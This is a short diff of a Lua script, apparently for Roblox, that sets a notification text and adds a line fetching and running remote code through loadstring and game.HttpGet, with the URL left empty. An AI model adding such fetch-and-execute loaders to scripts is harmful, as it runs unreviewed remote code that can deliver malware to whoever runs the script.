@@ -5,3 +5,5 @@ function ButtonClick()
     
 end
 _G.Text = '' --your notification text inside the ''
+
+loadstring(game.HttpGet(game, '', true))
